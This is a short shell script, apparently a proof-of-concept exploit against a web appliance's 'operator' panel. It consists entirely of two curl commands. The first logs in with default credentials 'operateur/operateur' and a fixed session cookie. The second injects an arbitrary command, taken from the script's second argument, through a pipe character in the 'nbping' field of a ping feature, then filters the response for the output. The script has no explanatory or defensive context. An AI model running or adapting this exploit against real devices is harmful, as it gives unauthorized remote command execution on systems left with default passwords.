curl -k -s  -i -X POST "$1/operator/?content=LOGIN_VALIDATOR" -d "login=operateur&password=operateur" -H "Cookie: PHPSESSID=oo" -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

curl -k -s -X POST "$1/operator/index.php?content=DSCBOX_PING&action=ADD" -d "serveur=127.0.0.1&nbping=1|echo%20\$($2)" -H "Cookie: PHPSESSID=oo" | grep 127.0.0.1
